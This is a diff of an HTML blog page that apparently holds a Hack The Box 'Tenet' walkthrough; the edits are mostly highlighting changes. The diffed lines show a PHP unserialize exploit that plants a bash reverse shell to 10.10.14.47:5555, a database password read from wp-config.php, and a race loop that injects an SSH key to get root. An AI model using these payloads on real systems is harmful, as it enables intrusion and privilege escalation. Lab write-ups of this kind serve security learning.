@@ -8,7 +8,7 @@
   <link rel="stylesheet" type="text/css" href="/css/style.css">
   <link rel="preconnect" href="https://fonts.gstatic.com"> 
   <link
-  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Roboto+Mono&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
   rel="stylesheet"> 
   <link rel="preconnect" href="https://fonts.gstatic.com">
   <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
@@ -22,6 +22,7 @@
 
 </head>
 
+<body>
 <!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
 <pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
  ___               _   ___   ___ 
@@ -73,34 +74,34 @@
 <div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> http://sator.tenet.htb/sator.php.bak</span></code></pre></div>
 <p>And analyze the code.</p>
 <div class="sourceCode" id="cb3"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">// sator.php</span></span>
-<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>&lt;<span class="ot">?</span>php</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span><span class="ot">?</span>php</span>
 <span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> <span class="kw">D</span>atabaseExport</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> <span class="cn">D</span>atabaseExport</span>
 <span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>{</span>
-<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">public</span> <span class="kw">$user_file</span> = <span class="st">&#39;users.txt&#39;</span><span class="ot">;</span></span>
-<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">public</span> <span class="kw">$data</span> = <span class="st">&#39;&#39;</span><span class="ot">;</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">public</span> <span class="va">$user_file</span> <span class="op">=</span> <span class="st">&#39;users.txt&#39;</span><span class="ot">;</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">public</span> <span class="va">$data</span> <span class="op">=</span> <span class="st">&#39;&#39;</span><span class="ot">;</span></span>
 <span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>        <span class="kw">public</span> <span class="kw">function</span> update_db<span class="ot">()</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>        <span class="kw">public</span> <span class="kw">function</span> update_db()</span>
 <span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>        {</span>
 <span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>                <span class="kw">echo</span> <span class="st">&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span><span class="ot">;</span></span>
-<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>                <span class="kw">$this</span>-&gt; data = <span class="st">&#39;Success&#39;</span><span class="ot">;</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>                <span class="va">$this</span>-&gt; data <span class="op">=</span> <span class="st">&#39;Success&#39;</span><span class="ot">;</span></span>
 <span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>        }</span>
 <span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>        <span class="kw">public</span> <span class="kw">function</span> <span class="fu">__destruct</span><span class="ot">()</span></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>        <span class="kw">public</span> <span class="kw">function</span> <span class="bu">__destruct</span>()</span>
 <span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>        {</span>
-<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>                <span class="fu">file_put_contents</span><span class="ot">(</span><span class="kw">__DIR__</span> . <span class="st">&#39;/&#39;</span> . <span class="kw">$this</span> -&gt;user_file<span class="ot">,</span></span>
-<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a><span class="kw">$this</span>-&gt;data<span class="ot">);</span></span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>                <span class="fu">file_put_contents</span>(<span class="cn">__DIR__</span> <span class="op">.</span> <span class="st">&#39;/&#39;</span> <span class="op">.</span> <span class="va">$this</span> -&gt;user_file<span class="ot">,</span></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a><span class="va">$this</span>-&gt;data)<span class="ot">;</span></span>
 <span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>                <span class="kw">echo</span> <span class="st">&#39;[] Database updated &lt;br&gt;&#39;</span><span class="ot">;</span></span>
 <span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a>        <span class="co">//      echo &#39;Gotta get this working properly...&#39;;</span></span>
 <span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>        }</span>
 <span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>}</span>
 <span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a><span class="kw">$input</span> = <span class="kw">$_GET</span><span class="ot">[</span><span class="st">&#39;arepo&#39;</span><span class="ot">]</span> <span class="ot">??</span> <span class="st">&#39;&#39;</span><span class="ot">;</span></span>
-<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a><span class="kw">$databaseupdate</span> = <span class="fu">unserialize</span><span class="ot">(</span><span class="kw">$input</span><span class="ot">);</span></span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a><span class="va">$input</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&#39;arepo&#39;</span>] <span class="op">??</span> <span class="st">&#39;&#39;</span><span class="ot">;</span></span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a><span class="va">$databaseupdate</span> <span class="op">=</span> <span class="fu">unserialize</span>(<span class="va">$input</span>)<span class="ot">;</span></span>
 <span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a><span class="kw">$app</span> = <span class="kw">new</span> <span class="kw">D</span>atabaseExport<span class="ot">;</span></span>
-<span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a><span class="kw">$app</span> -&gt; update_db<span class="ot">();</span></span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a><span class="va">$app</span> <span class="op">=</span> <span class="kw">new</span> <span class="cn">D</span>atabaseExport<span class="ot">;</span></span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a><span class="va">$app</span> -&gt; update_db()<span class="ot">;</span></span>
 <span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
@@ -116,12 +117,12 @@
 <p>So now, we write the class, serilize it and urlencode it to pass to the GET variable. We open a php interactive cli using</p>
 <div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">php</span> <span class="at">-a</span></span></code></pre></div>
 <p>we write the following</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> <span class="kw">D</span>atabaseExport {</span>
-<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">public</span> <span class="kw">$user_file</span> = <span class="st">&#39;rce.php&#39;</span><span class="ot">;</span></span>
-<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">public</span> <span class="kw">$data</span> = <span class="st">&#39;&lt;?php exec(&quot;/bin/bash -c </span><span class="kw">\&#39;</span><span class="st">bash -i &gt; /dev/tcp/10.10.14.47/5555 0&gt;&amp;1</span><span class="kw">\&#39;</span><span class="st">&quot;); ?&gt;&#39;</span><span class="ot">;</span></span>
+<div class="sourceCode" id="cb5"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> <span class="cn">D</span>atabaseExport {</span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">public</span> <span class="va">$user_file</span> <span class="op">=</span> <span class="st">&#39;rce.php&#39;</span><span class="ot">;</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">public</span> <span class="va">$data</span> <span class="op">=</span> <span class="st">&#39;&lt;?php exec(&quot;/bin/bash -c </span><span class="sc">\&#39;</span><span class="st">bash -i &gt; /dev/tcp/10.10.14.47/5555 0&gt;&amp;1</span><span class="sc">\&#39;</span><span class="st">&quot;); ?&gt;&#39;</span><span class="ot">;</span></span>
 <span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>  }</span>
 <span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="kw">print</span> <span class="fu">urlencode</span><span class="ot">(</span><span class="fu">serialize</span><span class="ot">(</span><span class="kw">new</span> <span class="kw">D</span>atabaseExport<span class="ot">));</span></span></code></pre></div>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="kw">print</span> <span class="fu">urlencode</span>(<span class="fu">serialize</span>(<span class="kw">new</span> <span class="cn">D</span>atabaseExport))<span class="ot">;</span></span></code></pre></div>
 <p>We copy the output of the print command and pass it to the GET variable using curl.</p>
 <div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-i</span> http://sator.tenet.htb/sator.php<span class="pp">?</span>arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.47%2F5555+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D</span></code></pre></div>
 <p>We open a nc listener on port 5555 and get a reverse shell by browsing the URI <code>http://sator.tenet.htb/rce.php</code>.</p>
@@ -129,10 +130,10 @@
 <h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
 <p>We find ourselves in the <code>html</code> directory. Going over to the <code>wordpress</code>directory, we find the config file <code>wp-config.php</code>. Cat-ing out the contents, we find a password for the user neil</p>
 <div class="sourceCode" id="cb8"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co">/** MySQL database username */</span></span>
-<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="fu">define</span><span class="ot">(</span> <span class="st">&#39;DB_USER&#39;</span><span class="ot">,</span> <span class="st">&#39;neil&#39;</span> <span class="ot">);</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="fu">define</span>( <span class="st">&#39;DB_USER&#39;</span><span class="ot">,</span> <span class="st">&#39;neil&#39;</span> )<span class="ot">;</span></span>
 <span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="co">/** MySQL database password */</span></span>
-<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="fu">define</span><span class="ot">(</span> <span class="st">&#39;DB_PASSWORD&#39;</span><span class="ot">,</span> <span class="st">&#39;Opera2112&#39;</span> <span class="ot">);</span></span></code></pre></div>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="fu">define</span>( <span class="st">&#39;DB_PASSWORD&#39;</span><span class="ot">,</span> <span class="st">&#39;Opera2112&#39;</span> )<span class="ot">;</span></span></code></pre></div>
 <p>Creds found:</p>
 <blockquote>
 <p>neil: Opera2112</p>
@@ -146,7 +147,7 @@
 <p>We have read permissions for the file /usr/local/bin/enableSSH.sh. Checking the file, the following function is interesting.</p>
 <div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="fu">addKey()</span> <span class="kw">{</span></span>
 <span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>        <span class="va">tmpName=$(</span><span class="fu">mktemp</span> <span class="at">-u</span> /tmp/ssh-XXXXXXXX<span class="va">)</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>        <span class="va">tmpName</span><span class="op">=</span><span class="va">$(</span><span class="fu">mktemp</span> <span class="at">-u</span> /tmp/ssh-XXXXXXXX<span class="va">)</span></span>
 <span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">(</span><span class="bu">umask</span> 110<span class="kw">;</span> <span class="fu">touch</span> <span class="va">$tmpName</span><span class="kw">)</span></span>
 <span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a></span>
@@ -158,7 +159,7 @@
 <span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a>        <span class="ex">/bin/rm</span> <span class="va">$tmpName</span></span>
 <span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a><span class="er">}</span></span></code></pre></div>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span></code></pre></div>
 <p>What this script does is writes a id_rsa.pub key defined in key to a randomly generated file of format <code>/tmp/ssh-XXXXXXXX</code> and then copies the contents of the file to the <code>known_hosts</code> of the root. And then deletes the tmp file.</p>
 <p>So, if we can write our own ssh key to the tmp file before it gets copied to known_hosts, our key will get written to known_hosts and we can ssh into root. So we write an infinite while loop in bash that continuously writes our ssh key to any file of format <code>/tmp/ssh-XXXXXXXX</code> using wild character. And while this runs, we run the script as sudo a number of times as we cannot be sure, if the key got written before the file getting removed.</p>
 <div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="fu">true</span><span class="kw">;</span> <span class="cf">do</span> <span class="bu">echo</span> <span class="st">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDhwQE3BL3VcaiJcQ3X6pEF841mBSpD*************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************IGnYgLXPDKmIwqC2nngvAVo7BLa+YzHy+9fuMs= root@kali&quot;</span> <span class="kw">|</span> <span class="fu">tee</span> /tmp/ssh<span class="pp">*</span> <span class="op">&gt;</span> /dev/null<span class="kw">;</span> <span class="cf">done</span></span></code></pre></div>
